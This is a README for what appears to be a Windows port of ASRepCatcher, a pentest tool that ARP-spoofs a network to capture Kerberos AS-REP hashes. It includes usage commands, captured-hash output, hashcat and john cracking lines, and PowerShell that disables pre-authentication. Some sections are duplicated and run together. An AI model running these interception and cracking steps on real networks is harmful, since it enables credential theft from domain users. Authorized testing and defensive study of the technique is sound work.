# ASRepCatcher-Win - Windows Port


### Listen 

In listen mode, the ARP cache of the gateway is poisoned in order to receive the AS-REP responses destined to the clients.
This is a passive mode with no alteration of packets in transit.

```bash
python ASRepCatcher/ASRepCatcher-WIN.py listen -targets <ONE OR MORE IPS> -dc <IP>
```

### Relay

```bash
python ASRepCatcher/ASRepCatcher-WIN.py relay -dc 192.168.1.100
```

**Bonus**: The tool catches usernames in Kerberos responses to provide more domain intelligence.

## Windows vs Linux Differences

### Architecture Differences
- **Linux Version**: Uses native iptables for traffic redirection
- **Windows Version**: Uses netsh and Windows Firewall for traffic management
- **Packet Handling**: Windows requires different approaches for raw socket operations
- **IP Forwarding**: Windows uses registry and netsh instead of /proc/sys/net

### Implementation Changes
- **Rich UI**: Windows version features enhanced terminal interface with live statistics
- **Error Handling**: Enhanced Windows-specific error handling and cleanup
- **Network Configuration**: Automatic backup/restore of Windows network settings
- **ARP Spoofing**: Adapted for Windows network stack behavior

### Performance Considerations
- **Memory Usage**: Windows version includes additional Rich UI components
- **Network Performance**: Different packet processing pipeline than Linux
- **Resource Management**: Windows-specific cleanup and resource managementREProasting

**Author**: Samara Eli (Windows port of original work by Yassine OUKESSOU)

During an Active Directory black box pentest, if multicast DNS protocols are disabled and/or all protocols (SMB, LDAP, etc.) are signed and no exposed service is vulnerable, you quickly run out of options to get a domain user.

ASRepCatcher uses ARP spoofing to catch AS-REP messages returned by the Domain Controller to the clients and prints out the hash to crack.

**Important**: This technique requires Kerberos pre-authentication to be disabled on target user accounts. The tool captures AS-REP responses for users who have the "Do not require Kerberos preauthentication" attribute set.

## Current Status

### Working Features
- **Listen Mode**: Fully functional with enhanced Rich UI
- **ARP Spoofing**: Windows-compatible implementation
- **Hash Capture**: Successfully captures AS-REP hashes in crackable format
- **Traffic Management**: Automatic Windows firewall and IP forwarding configuration
- **Enhanced Interface**: Rich terminal UI with live updates and statistics

### Testing Status
**Limited Lab Testing**: This Windows port has only been tested in a controlled lab environment with:
- 1 Domain Controller (Windows Server)
- 1 Target workstation (Windows)
- 1 Attacker machine (Windows)
- Users with pre-authentication disabled

**Production environments and larger networks have not been tested.**

### TODO: Relay Mode
**Relay mode is currently under development** and not yet functional in the Windows port. The main challenges are:
- Windows-specific network stack differences
- Packet reassembly and TCP session handling
- Proper Kerberos message parsing on Windows

## Two Modes

### Relay

In relay mode (Linux original), the Kerberos TGT requests (AS-REQ) coming from workstations are relayed to the DC. If RC4 is allowed, the clients are forced to use it.

```bash
ASRepCatcher relay -dc 192.168.1.100
```

### Listen

In listen mode, the ARP cache of the gateway is poisoned in order to receive the AS-REP responses destined to the clients.
This is a passive mode, there is no alteration of the packets in transit.

```bash
ASRepCatcher listen
```
<br><ins>Bonus</ins> : The tool catches unseen usernames in TGS-REP responses in order to give the attacker more information about the domain.

## Features of ARP Spoofing
In both modes, the ARP spoofing is **never in full-duplex: only one way is targeted**. The purpose is to reduce network load on the attacker host.

If executed with `--stop-spoofing` option, a **client computer's IP is removed from the list** whenever a hash is retrieved:
- In relay mode: the client's ARP cache is restored
- In listen mode: the entry in the gateway's ARP cache is restored

**Note**: It's better not to use the `--stop-spoofing` option as there can be many users on the same IP (shared computers, DHCP, NAT, etc.)

If you prefer to use your own spoofing method, you can disable ARP spoofing with `--disable-spoofing`.

## Installation

### Prerequisites
- Windows 10/11 or Windows Server 2016+
- Python 3.7 or higher
- Administrator privileges (required for network operations)
- **Target users must have Kerberos pre-authentication disabled**
  - Set "Do not require Kerberos preauthentication" on target accounts
  - This is typically configured via Active Directory Users and Computers

### System Dependencies

#### Packet Capture Support (Required)
Scapy requires a packet capture library for Windows:

**Option 1: Npcap (Recommended)**
- Download: [https://npcap.com/#download](https://npcap.com/#download)
- Install with "WinPcap API-compatible Mode" enabled
- More stable and actively maintained

**Option 2: WinPcap (Legacy)**
- Download: [https://www.winpcap.org/install/](https://www.winpcap.org/install/)
- Older but still functional

#### Network Interface Support
- `netifaces` may require Microsoft Visual C++ Build Tools
- Download: [Microsoft C++ Build Tools](https://visualstudio.microsoft.com/visual-cpp-build-tools/)
- Or install Visual Studio with C++ development tools

### Python Installation

#### Create Virtual Environment (Recommended)
```bash
# Navigate to project directory
cd ASRepCatcher-Win

# Create virtual environment
python -m venv asrepcatcher-env

# Activate virtual environment
# For Command Prompt:
asrepcatcher-env\Scripts\activate.bat
# For PowerShell:
asrepcatcher-env\Scripts\Activate.ps1

# Install dependencies
pip install -r requirements.txt
```

#### Alternative: System-wide Installation
```bash
pip install -r requirements.txt
```

### Manual Installation from Source
```bash
git clone https://github.com/mojibake-dev/ASRepCatcher-Win
cd ASRepCatcher-Win

# Create and activate virtual environment
python -m venv asrepcatcher-env
asrepcatcher-env\Scripts\activate.bat  # or .ps1 for PowerShell

# Install dependencies
pip install -r requirements.txt

# Optional: Install in development mode
pip install -e .
```

## Usage

**Note**: If using a virtual environment, ensure it's activated before running commands.

```
python ASRepCatcher/ASRepCatcher-WIN.py [-h] [-outfile OUTFILE] [-usersfile USERSFILE] 
                          [-format {hashcat,john}] [-debug] [-t Client workstations] 
                          [-tf targets file] [-gw Gateway IP] [-dc DC IP] 
                          [-iface interface] [--port PORT] [--skip-redirection]
                          [--stop-spoofing] [--disable-spoofing]
                          {relay,listen}

Catches Kerberos AS-REP packets and outputs them in a crackable format

positional arguments:
  {relay,listen}        Relay mode  : AS-REQ requests are relayed to capture AS-REP (TODO: Under development)
                        Listen mode : AS-REP packets going to clients are sniffed (Fully working)

options:
  -h, --help            show this help message and exit
  -outfile OUTFILE      Output filename to write hashes to crack
  -usersfile USERSFILE  Output file name to write discovered usernames
  -format {hashcat,john}
                        Format to save the AS_REP hashes. Default is hashcat
  -debug                Increase verbosity
  -dc DC IP             Domain controller's IP
  -iface interface      Interface to use. Uses default interface if not specified
  --port PORT           Port to use for relay server (default: 88)
  --skip-redirection    Skip setting up traffic redirection

ARP poisoning:
  -t Client workstations
                        Comma separated list of client computers IP addresses or subnet (IP/mask)
  -tf targets file      File containing client workstations IP addresses
  -gw Gateway IP        Gateway IP. Default is default interface's gateway
  --stop-spoofing       Stops poisoning the target once an AS-REP packet is received
  --disable-spoofing    Disables ARP spoofing entirely
```

## Examples

### Basic Listen Mode (Recommended)
```bash
# Activate virtual environment first (if using)
asrepcatcher-env\Scripts\activate.bat

# Listen on default interface for AS-REP packets
python ASRepCatcher/ASRepCatcher-WIN.py listen

# Specify domain controller and output file
python ASRepCatcher/ASRepCatcher-WIN.py listen -dc 192.168.1.100 -outfile hashes.txt

# Target specific subnet with debug output
python ASRepCatcher/ASRepCatcher-WIN.py listen -t 192.168.1.0/24 -debug
```

### Advanced Usage
```bash
# Use specific interface and gateway
python ASRepCatcher/ASRepCatcher-WIN.py listen -iface "Ethernet" -gw 192.168.1.1

# Save both hashes and discovered usernames
python ASRepCatcher/ASRepCatcher-WIN.py listen -outfile hashes.txt -usersfile users.txt

# Disable ARP spoofing (use external method)
python ASRepCatcher/ASRepCatcher-WIN.py listen --disable-spoofing
```

## Successful Hash Capture Example

When the tool successfully captures AS-REP hashes, you'll see output like:

```
HASH CAPTURED!
Username: testuser@local.lab
Encryption Type: 23
Hash: $krb5asrep$23$testuser@LOCAL.LAB:a8b2c3d4e5f6...
```

These hashes can be cracked using:
```bash
# Hashcat
hashcat -m 18200 hashes.txt wordlist.txt

# John the Ripper
john --wordlist=wordlist.txt hashes.txt
```

## Troubleshooting

### Installation Issues

#### Scapy Kerberos Layer Problems
```bash
# If you get "Kerberos layers not available"
pip install scapy[complete]

# Or install cryptography separately
pip install cryptography scapy
```

#### Netifaces Compilation Issues
```bash
# Install Microsoft Visual C++ Build Tools first
# Then reinstall netifaces
pip uninstall netifaces
pip install netifaces
```

#### Packet Capture Issues
1. **"No module named '_winpcap'"**: Install Npcap or WinPcap
2. **"Permission denied"**: Run as Administrator
3. **"Could not open adapter"**: Check if packet capture driver is properly installed

### Common Runtime Issues
1. **"Administrator privileges required"**: Run PowerShell/CMD as Administrator
2. **"Interface not found"**: Use `-iface` to specify correct network interface
3. **"Port 88 in use"**: Another service is using Kerberos port, use `--port` option
4. **"No packets captured"**: Check network connectivity and ARP spoofing status
5. **"No hashes captured"**: Ensure target users have pre-authentication disabled

### Pre-authentication Setup
To disable Kerberos pre-authentication on target accounts:
```powershell
# PowerShell command to disable pre-auth for a user
Set-ADUser -Identity "username" -DoesNotRequirePreAuth $true

# Or via ADSI Edit: Set userAccountControl to include UF_DONT_REQUIRE_PREAUTH (0x400000)
```

### Testing Environment
This tool has been validated in a small lab environment:
- Single domain controller
- Single target workstation
- Controlled network with minimal traffic
- Users specifically configured with pre-auth disabled

**For production testing, additional validation is recommended.**

### Debug Mode
Use `-debug` flag for verbose output to troubleshoot network and parsing issues.

## Contributing

This is a Windows port of the original ASRepCatcher by Yassine OUKESSOU. Contributions welcome, especially for:
- Relay mode implementation
- Performance optimizations
- Additional Windows-specific features

## Credits

- **Original ASRepCatcher**: [Yassine OUKESSOU](https://github.com/Yaxxine7/ASRepCatcher)
- **Windows Port**: Samara Eli
- **Concept**: AS-REP roasting technique for domain enumeration

## License

See LICENSE file for details.

---

**WARNING**: This tool is for authorized penetration testing and educational purposes only. Do not use against networks you don't own or have explicit permission to test.
